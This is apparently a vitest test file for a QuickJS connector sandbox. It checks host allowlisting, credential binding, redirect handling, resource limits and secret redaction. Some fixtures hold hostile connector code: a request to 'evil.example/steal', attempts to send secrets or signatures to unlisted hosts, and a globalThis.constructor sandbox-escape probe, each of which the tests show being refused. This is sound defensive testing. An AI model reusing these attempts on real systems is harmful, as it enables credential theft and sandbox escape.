import { createHmac } from "node:crypto";
import { AdapterError, type HttpFetch, type HttpResponse } from "@freebirdai/dash-adapters";
import { connectionSchema, getOp, resolveRange, type ConnectionSpec } from "@freebirdai/dash-spec";
import { describe, expect, it } from "vitest";
import { ConnectorAdapter, connectorHash } from "./adapter.js";
import { MemoryConnectorTokens } from "./host.js";
import { QuickJsSandbox } from "./sandbox.js";

/*
 * The sandbox and its authority, exercised. These show each control working
 * on the attempt it exists for; they cannot prove there is no other way
 * around it — see the residual risks in `dash/PLATFORM.md`.
 */

const API = "api.connector.test";
const OTHER = "other.connector.test";
const FILES = "files.connector.test";
const KEY_ID = "kid_7731";
const SECRET = "sec_q8w9e7";
const PASSWORD = "pw_5566aa";
const NOW = Date.UTC(2026, 8, 28, 12);

interface Sent {
  readonly method: string;
  readonly url: string;
  readonly headers: Readonly<Record<string, string>>;
  readonly body?: string;
}

type Answer = { status: number; body?: unknown; headers?: Record<string, string> };

/** An HTTP transport that answers from a table and remembers every request. */
const transport = (answer: (request: Sent) => Answer) => {
  const sent: Sent[] = [];
  const http: HttpFetch = async (url, init, allowedHost) => {
    const request = { method: init.method ?? "GET", url, headers: init.headers, ...(init.body !== undefined ? { body: init.body } : {}) };
    sent.push(request);
    if (new URL(url).hostname !== allowedHost) throw new Error(`transport pinned to ${allowedHost}`);
    const { status, body, headers = {} } = answer(request);
    const text = typeof body === "string" ? body : body === undefined ? "" : JSON.stringify(body);
    const lower = Object.fromEntries(Object.entries({ "content-type": typeof body === "string" ? "text/plain" : "application/json", ...headers }).map(([k, v]) => [k.toLowerCase(), v]));
    const response: HttpResponse = { status, text, url, header: (name) => lower[name.toLowerCase()] ?? null };
    return response;
  };
  return { http, sent };
};

const secrets: Record<string, string> = { "t-key-1": KEY_ID, "t-key-2": SECRET, "t-pass": PASSWORD };

const connectionWith = (code: string, authority: Record<string, unknown> = {}, extra: Record<string, unknown> = {}): ConnectionSpec =>
  connectionSchema.parse({
    id: "t",
    title: "Test API",
    kind: "rest",
    baseUrl: `https://${API}/v1`,
    auth: {
      type: "connector",
      credentials: [
        { name: "key_id", keyRef: "t-key-1", label: "Key ID" },
        { name: "secret", keyRef: "t-key-2", label: "Secret" },
        { name: "password", keyRef: "t-pass", label: "Password" },
      ],
      tokens: [{ name: "session", keyRef: "t-session" }],
    },
    ops: [
      { id: "records", title: "Records", path: "/records", servedBy: "connector" },
      { id: "listed", title: "Listed", path: "/listed", pagination: { kind: "page", param: "page", startsAt: 1 }, maxPages: 5 },
    ],
    connector: {
      code,
      hash: connectorHash(code),
      hooks: ["read"],
      serves: ["records"],
      authority: {
        destinations: [
          { host: API, methods: ["GET", "POST"], credentials: ["key_id", "secret", "password", "session"] },
          { host: OTHER, methods: ["GET"], credentials: [] },
          { host: FILES, role: "download", methods: ["GET"] },
        ],
        exchanges: [{ name: "session", fields: ["$.account"] }],
        requests: 20,
        sleepMs: 5_000,
        wallMs: 20_000,
        ...authority,
      },
      author: { by: "person", at: "2026-09-28T00:00:00.000Z" },
    },
    ...extra,
  });

const sandbox = new QuickJsSandbox({ memoryBytes: 32 * 1024 * 1024, cpuMs: 1_500, stackBytes: 256 * 1024, wallMs: 20_000 });

const read = async (connection: ConnectionSpec, http: HttpFetch, opId = "records", tokens = new MemoryConnectorTokens()) => {
  const logs: string[] = [];
  let clock = NOW;
  const adapter = new ConnectorAdapter(http, {
    sandbox,
    tokens,
    now: () => clock,
    sleep: async (ms) => {
      clock += ms;
    },
    onLog: (_connection, line) => logs.push(line),
  });
  const op = getOp(connection, opId)!;
  const params = { range: resolveRange({ preset: "30d", now: NOW }), filters: {} };
  const result = await adapter.fetch(connection, op, {}, { params, now: NOW, resolveSecret: async (keyRef) => secrets[keyRef] ?? null });
  return { result, logs };
};

const refusal = async (promise: Promise<unknown>): Promise<AdapterError> => {
  try {
    await promise;
  } catch (error) {
    expect(error).toBeInstanceOf(AdapterError);
    return error as AdapterError;
  }
  throw new Error("expected the read to be refused");
};

describe("connector: reading", () => {
  it("reads records a connector's code produces, from its own requests", async () => {
    const { http, sent } = transport((request) =>
      request.url.endsWith("/v1/items?page=2") ? { status: 200, body: { items: [{ id: 3 }], next: null } } : { status: 200, body: { items: [{ id: 1 }, { id: 2 }], next: 2 } },
    );
    const code = `async function read(ctx) {
      const rows = [];
      let page = 1;
      while (page) {
        const answer = await http.request({ url: "/items", query: { page } });
        rows.push(...answer.body.items);
        page = answer.body.next;
      }
      return { rows, total: 3 };
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([{ id: 1 }, { id: 2 }, { id: 3 }]);
    expect(result.meta.reportedTotal).toBe(3);
    expect(result.meta.truncated).toBe(false);
    expect(sent.map((one) => one.url)).toEqual([`https://${API}/v1/items?page=1`, `https://${API}/v1/items?page=2`]);
  });

  it("signs every request a declared endpoint sends, and never hands the code a secret", async () => {
    const expected = (request: Sent) => createHmac("sha256", SECRET).update(`${request.method} ${new URL(request.url).pathname}${new URL(request.url).search}`).digest("hex");
    const { http, sent } = transport((request) => {
      if (request.headers["x-signature"] !== expected(request) || request.headers["x-key"] !== KEY_ID) return { status: 401, body: { error: "bad signature" } };
      const page = new URL(request.url).searchParams.get("page");
      return { status: 200, body: page === "1" ? [{ id: 1 }, { id: 2 }] : [] };
    });
    const code = `async function signRequest(request) {
      const url = request.url.replace(/^https:\\/\\/[^/]+/, "");
      request.headers["x-key"] = "{{secret:key_id}}";
      request.headers["x-signature"] = await crypto.hmac({ key: "secret", data: request.method + " " + url });
      return request;
    }`;
    const connection = connectionWith(code, {}, {});
    const signed = { ...connection, connector: { ...connection.connector!, hooks: ["signRequest" as const], serves: [] } };
    const { result } = await read(signed, http, "listed");
    expect(result.body).toEqual([{ id: 1 }, { id: 2 }]);
    expect(sent).toHaveLength(2);
    expect(sent.every((one) => one.headers["x-key"] === KEY_ID)).toBe(true);
  });

  it("does not run code that no longer matches its pin", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const connection = connectionWith("async function read() { return [] }");
    const tampered = { ...connection, connector: { ...connection.connector!, code: "async function read() { return [{ changed: true }] }" } };
    const error = await refusal(read(tampered, http));
    expect(error.userMessage).toMatch(/changed since it was checked/);
    expect(sent).toHaveLength(0);
  });

  it("gives the code the server's clock, and no network, file system or process of its own", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      return [{ now: Date.now(), iso: new Date().toISOString(), fetch: typeof fetch, require: typeof require, process: typeof process, std: typeof std, os: typeof os, XMLHttpRequest: typeof XMLHttpRequest }];
    }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { now: NOW, iso: new Date(NOW).toISOString(), fetch: "undefined", require: "undefined", process: "undefined", std: "undefined", os: "undefined", XMLHttpRequest: "undefined" },
    ]);
  });

  it("parses CSV the way a spreadsheet would", async () => {
    const csv = '﻿id,amount,note,when\r\n1,12.50,"a, ""quoted"" b",2026-07-01\r\n2,0.75,,007\r\n\r\n';
    const { http } = transport(() => ({ status: 200, body: csv, headers: { "content-type": "text/csv" } }));
    const code = `async function read() { return (await http.request({ url: "/export" })).body }`;
    const { result } = await read(connectionWith(code), http);
    expect(result.body).toEqual([
      { id: 1, amount: 12.5, note: 'a, "quoted" b', when: "2026-07-01" },
      { id: 2, amount: 0.75, note: null, when: "007" },
    ]);
  });

  it("says so when the code stopped short", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const { result } = await read(connectionWith(`async function read() { return { rows: [{ a: 1 }], total: 5 } }`), http);
    expect(result.meta.truncated).toBe(true);
    expect(result.meta.warnings.join(" ")).toMatch(/reports 5 record\(s\).*excludes/);
  });
});

describe("connector: containment", () => {
  it("stops code that never ends", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(read(connectionWith("async function read() { while (true) {} }"), http));
    expect(error.userMessage).toMatch(/ran longer than it may/);
  });

  it("stops code that allocates without bound", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(
      read(connectionWith("async function read() { const all = []; for (;;) all.push(new Array(100000).fill(7)); }"), http),
    );
    expect(error.userMessage).toMatch(/more memory than it may/);
  });

  it("refuses an address the authority does not list, before anything is sent", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const error = await refusal(read(connectionWith(`async function read() { await http.request({ url: "https://evil.example/steal" }); return [] }`), http));
    expect(error.userMessage).toMatch(/evil\.example is not an address this connector may reach/);
    expect(sent).toHaveLength(0);
  });

  it("refuses a method that changes things, and one the address does not allow", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const put = await refusal(read(connectionWith(`async function read() { await http.request({ method: "DELETE", url: "/records/1" }); return [] }`), http));
    expect(put.userMessage).toMatch(/changes things.*review/);
    const post = await refusal(read(connectionWith(`async function read() { await http.request({ method: "POST", url: "https://${OTHER}/x", body: "{}" }); return [] }`), http));
    expect(post.userMessage).toMatch(/POST is not allowed to other\.connector\.test/);
    expect(sent).toHaveLength(0);
  });

  it("puts a credential only into a request to an address bound to it", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() { await http.request({ url: "https://${OTHER}/x", headers: { authorization: "Bearer {{secret:secret}}" } }); return [] }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/"secret" may not be sent to other\.connector\.test/);
    expect(sent).toHaveLength(0);
  });

  it("refuses a signature made with a credential on its way to an address not bound to it", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      const signature = await crypto.hmac({ key: "secret", data: "anything the code likes" });
      await http.request({ url: "https://${OTHER}/collect", query: { s: signature } });
      return [];
    }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/signature made with "secret" may not be sent/);
    expect(sent).toHaveLength(0);
  });

  it("does not follow a redirect to another host, and refuses the code's own attempt to", async () => {
    const { http, sent } = transport((request) =>
      request.url.includes(OTHER) ? { status: 200, body: [] } : { status: 302, headers: { location: `https://evil.example/landing` } },
    );
    const code = `async function read() {
      const first = await http.request({ url: "/start" });
      await http.request({ url: first.headers.location });
      return [];
    }`;
    const error = await refusal(read(connectionWith(code), http));
    expect(error.userMessage).toMatch(/evil\.example is not an address/);
    expect(sent.map((one) => new URL(one.url).hostname)).toEqual([API]);
  });

  it("reaches a download address only where the API gave it, and never with a credential", async () => {
    const file = `https://${FILES}/exports/9/data.csv?sig=abc`;
    const { http, sent } = transport((request) =>
      request.url.startsWith(`https://${FILES}`) ? { status: 200, body: "a,b\n1,2", headers: { "content-type": "text/csv" } } : { status: 200, body: { url: file } },
    );
    const invented = await refusal(read(connectionWith(`async function read() { return (await http.request({ url: "https://${FILES}/exports/1/data.csv" })).body }`), http));
    expect(invented.userMessage).toMatch(/download address the API did not give/);
    const withKey = await refusal(
      read(connectionWith(`async function read() { const a = await http.request({ url: "/exports/9" }); return (await http.request({ url: a.body.url, headers: { "x-key": "{{secret:key_id}}" } })).body }`), http),
    );
    expect(withKey.userMessage).toMatch(/"key_id" may not be sent to files\.connector\.test/);
    const { result } = await read(connectionWith(`async function read() { const a = await http.request({ url: "/exports/9" }); return (await http.request({ url: a.body.url })).body }`), http);
    expect(result.body).toEqual([{ a: 1, b: 2 }]);
    expect(sent.filter((one) => one.url.startsWith(`https://${FILES}`))).toHaveLength(1);
  });

  it("takes an echoed credential out of what the code sees", async () => {
    const { http } = transport((request) => ({ status: 200, body: { youSent: request.headers["x-key"] } }));
    const code = `async function read() {
      const answer = await http.request({ url: "/echo", headers: { "x-key": "{{secret:secret}}" } });
      log("the API said", answer.body.youSent);
      return [{ echoed: answer.body.youSent }];
    }`;
    const { result, logs } = await read(connectionWith(code), http);
    expect(result.body).toEqual([{ echoed: "[redacted]" }]);
    expect(logs.join(" ")).not.toContain(SECRET);
  });

  it("keeps a login's token host-side, hands back only declared fields, and reuses it", async () => {
    let logins = 0;
    const { http, sent } = transport((request) => {
      if (request.url.endsWith("/login")) {
        logins++;
        const body = JSON.parse(request.body ?? "{}");
        return body.password === PASSWORD ? { status: 200, body: { token: "tok_live_123456", ttl: 3600, account: "acme", internal: "hidden" } } : { status: 401, body: {} };
      }
      return request.headers.authorization === "Bearer tok_live_123456" ? { status: 200, body: [{ ok: true }] } : { status: 401, body: {} };
    });
    const code = `async function authenticate() {
      const session = await auth.exchange({ name: "session", request: { method: "POST", url: "/login", body: { password: "{{secret:password}}" } }, token: "$.token", expiresIn: "$.ttl", fields: ["$.account", "$.internal"] });
      log(JSON.stringify(session));
    }
    async function read() {
      return (await http.request({ url: "/things", headers: { authorization: "Bearer {{secret:session}}" } })).body;
    }`;
    const tokens = new MemoryConnectorTokens();
    const connection = connectionWith(code);
    const both = { ...connection, connector: { ...connection.connector!, hooks: ["authenticate" as const, "read" as const] } };
    const first = await read(both, http, "records", tokens);
    expect(first.result.body).toEqual([{ ok: true }]);
    expect(first.logs.join(" ")).toContain('"$.account":"acme"');
    expect(first.logs.join(" ")).not.toContain("hidden");
    expect(first.logs.join(" ")).not.toContain("tok_live");
    await read(both, http, "records", tokens);
    expect(logins).toBe(1);
    expect(sent.filter((one) => one.url.endsWith("/things"))).toHaveLength(2);
  });

  /* Checkpoint 1: a signRequest that adds the session asked for one on the login that creates it. */
  it("does not pass a login through signRequest unless asked", async () => {
    const { http } = transport((request) =>
      request.url.endsWith("/login")
        ? request.headers["x-session"] !== undefined
          ? { status: 400, body: { error: "the login carried a session" } }
          : { status: 200, body: { token: "tok_live_7890ab", ttl: 600 } }
        : { status: 200, body: [{ session: request.headers["x-session"] === "tok_live_7890ab" }] },
    );
    const code = `async function authenticate() {
      await auth.exchange({ name: "session", request: { method: "POST", url: "/login", body: { password: "{{secret:password}}" } }, token: "$.token", expiresIn: "$.ttl" });
    }
    async function signRequest(request) { request.headers["x-session"] = "{{secret:session}}"; return request; }
    async function read() { return (await http.request({ url: "/things" })).body; }`;
    const connection = connectionWith(code);
    const { result } = await read({ ...connection, connector: { ...connection.connector!, hooks: ["authenticate", "signRequest", "read"] } }, http);
    expect(result.body).toEqual([{ session: true }]);
  });

  it("stops at the run's request allowance and its waiting allowance", async () => {
    const { http, sent } = transport(() => ({ status: 200, body: [] }));
    const many = await refusal(read(connectionWith(`async function read() { for (let i = 0; i < 50; i++) await http.request({ url: "/x" }); return [] }`, { requests: 5 }), http));
    expect(many.userMessage).toMatch(/all 5 requests it may/);
    expect(sent).toHaveLength(5);
    const waits = await refusal(read(connectionWith(`async function read() { await sleep(4000); await sleep(4000); return [] }`), http));
    expect(waits.userMessage).toMatch(/may wait 5s in all/);
  });

  it("sends a failed read again within the allowance, and a POST never", async () => {
    let calls = 0;
    const { http } = transport((request) => {
      calls++;
      return request.method === "GET" && calls < 2 ? { status: 503, body: {} } : request.method === "POST" ? { status: 503, body: {} } : { status: 200, body: [{ ok: 1 }] };
    });
    const { result } = await read(connectionWith(`async function read() { return (await http.request({ url: "/x" })).body }`), http);
    expect(result.body).toEqual([{ ok: 1 }]);
    calls = 0;
    const { http: http2, sent } = transport(() => ({ status: 503, body: {} }));
    await refusal(read(connectionWith(`async function read() { const a = await http.request({ method: "POST", url: "/search", body: {} }); if (a.status >= 500) throw new Error("server error"); return [] }`, { retries: 3 }), http2));
    expect(sent).toHaveLength(1);
  });

  it("hands the code an identifier it declared, and never a secret, whatever it declares", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const base = connectionWith(`async function read() { return [{ id: await credentials.identifier("key_id") }] }`);
    const auth = base.auth.type === "connector" ? base.auth : null;
    const declared = (secretOf: (name: string) => boolean | undefined) => ({
      ...base,
      auth: { ...auth!, credentials: auth!.credentials.map((one) => ({ ...one, secret: secretOf(one.name) })) },
    });
    const { result } = await read(declared((name) => (name === "key_id" ? false : undefined)), http);
    expect(result.body).toEqual([{ id: KEY_ID }]);

    /* Not declared an identifier: a secret, used for the code and never handed over. */
    const undeclared = await refusal(read(base, http));
    expect(undeclared.userMessage).toMatch(/"key_id" is a secret/);

    /* Declared one, but named like a secret: still refused. */
    const named = connectionWith(`async function read() { return [{ s: await credentials.identifier("secret") }] }`);
    const namedAuth = named.auth.type === "connector" ? named.auth : null;
    const claimed = { ...named, auth: { ...namedAuth!, credentials: namedAuth!.credentials.map((one) => ({ ...one, secret: false })) } };
    const refused = await refusal(read(claimed, http));
    expect(refused.userMessage).toMatch(/"secret" is a secret/);
  });

  it("cannot reach the server's own globals or environment", async () => {
    const { http } = transport(() => ({ status: 200, body: [] }));
    const code = `async function read() {
      let escaped = "no";
      try { escaped = globalThis.constructor.constructor("return typeof process + typeof require + typeof fetch")(); } catch (e) { escaped = "threw"; }
      return [{ escaped, keys: Object.keys(globalThis).filter((k) => !k.startsWith("__")).sort().join(",") }];
    }`;
    const { result } = await read(connectionWith(code), http);
    const [row] = result.body as Array<{ escaped: string; keys: string }>;
    expect(row!.escaped).toBe("undefinedundefinedundefined");
    expect(row!.keys).not.toMatch(/process|require|fetch|Buffer/);
  });
});
